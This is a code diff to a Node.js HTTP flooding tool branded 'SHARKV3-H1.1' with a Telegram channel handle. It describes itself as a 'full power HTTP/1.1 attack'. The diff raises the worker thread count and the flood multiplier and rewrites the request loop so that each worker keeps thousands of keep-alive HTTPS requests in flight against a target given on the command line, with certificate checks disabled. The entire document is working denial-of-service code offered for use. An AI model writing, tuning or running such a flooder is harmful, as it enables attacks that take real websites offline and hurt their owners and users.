@@ -5,11 +5,10 @@ const readline = require('readline');
 const net = require('net');
 const url = require('url');
 
-const THREADS = 32;
+const THREADS = 48;
 const INITIAL_CONNECTIONS = 50;
-const POWER_MULTIPLIER = 4;
+const POWER_MULTIPLIER = 5;
 const MAX_INFLIGHT = 4000;
-const LIVE_REFRESH_RATE = 1100;
 
 let totalRequests = 0;
 let successCount = 0;
@@ -27,8 +26,8 @@ if (isMainThread) {
     const duration = parseInt(process.argv[3]);
 
     console.clear();
-    console.log(`SHARKV3-H1.1 - T.ME/STSVKINGDOM`);
-    console.log(`Starting full power HTTP/1.1 attack...`);
+    console.log(`SHARKV3-H1.1 FIXED - T.ME/STSVKINGDOM`);
+    console.log(`Firing full power...`);
 
     for (let i = 0; i < THREADS; i++) {
         new Worker(__filename, { workerData: { target, duration, initial: true } });
@@ -42,12 +41,12 @@ if (isMainThread) {
         maxRps = Math.max(maxRps, rpsLastSecond);
         renderStats();
         rpsLastSecond = 0;
-    }, LIVE_REFRESH_RATE);
+    }, 1000);
 
     function renderStats() {
         readline.cursorTo(process.stdout, 0, 0);
         readline.clearScreenDown(process.stdout);
-        console.log(`SHARKV3-H1.1 - T.ME/STSVKINGDOM`);
+        console.log(`SHARKV3-H1.1 FIXED - T.ME/STSVKINGDOM`);
         console.log(`===========================`);
         console.log(`total: ${totalRequests}`);
         console.log(`max-r: ${maxRps}`);
@@ -80,47 +79,54 @@ if (isMainThread) {
 
     const agent = new https.Agent({
         keepAlive: true,
-        maxSockets: Infinity,
-        maxFreeSockets: Infinity
+        maxSockets: 5000,
+        maxFreeSockets: 5000
     });
 
-    function sendOne() {
-        if (Date.now() > end) return;
+    function createFlooder() {
+        let inflight = 0;
 
-        const options = {
-            hostname,
-            port,
-            path,
-            method: 'GET',
-            agent,
-            rejectUnauthorized: false,
-            headers: {
-                'User-Agent': 'Mozilla/5.0',
-                'Connection': 'keep-alive'
+        function send() {
+            if (Date.now() > end || inflight >= MAX_INFLIGHT) {
+                return setTimeout(send, 10);
             }
-        };
 
-        try {
+            inflight++;
             sendStat('req');
-            const req = https.request(options, res => {
+
+            const req = https.request({
+                hostname,
+                port,
+                path,
+                method: 'GET',
+                agent,
+                headers: {
+                    'User-Agent': 'Mozilla/5.0',
+                    'Connection': 'keep-alive',
+                },
+                rejectUnauthorized: false,
+            }, res => {
                 res.on('data', () => {});
-                res.on('end', () => sendStat('ok'));
+                res.on('end', () => {
+                    inflight--;
+                    sendStat('ok');
+                    setImmediate(send);
+                });
             });
 
-            req.on('error', () => sendStat('err'));
-            req.end();
-        } catch {
-            sendStat('err');
-        }
-    }
+            req.on('error', () => {
+                inflight--;
+                sendStat('err');
+                setImmediate(send);
+            });
 
-    function sendFlood() {
-        if (Date.now() > end) return;
-        for (let i = 0; i < 150; i++) sendOne();
-        setTimeout(sendFlood, 1);
+            req.end();
+        }
+
+        for (let i = 0; i < 100; i++) send();
     }
 
     for (let i = 0; i < connections; i++) {
-        sendFlood();
+        createFlooder();
     }
 }
